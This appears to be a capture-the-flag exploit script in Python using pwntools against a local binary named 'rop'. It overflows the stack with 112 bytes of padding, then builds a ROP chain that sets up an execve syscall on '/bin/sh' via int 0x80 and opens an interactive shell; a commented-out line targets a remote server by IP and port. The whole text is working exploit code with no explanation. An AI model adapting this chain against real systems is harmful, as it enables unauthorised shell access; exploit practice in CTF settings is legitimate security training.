from pwn import * 

p= process('./rop')

pop_eax_ret= 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90

int_0x80 = 0x08049421
binsh = 0x080be408
payload= "a"*112
payload+= p32(pop_eax_ret)
payload+= p32(0x0b)
payload+= p32(pop_edx_ecx_ebx_ret)
payload+= p32(0)
payload+= p32(0)
payload+= p32(binsh)
payload+= p32(int_0x80)
#p = remote("45.122.249.68",10005)
p.sendline(payload)
p.interactive()

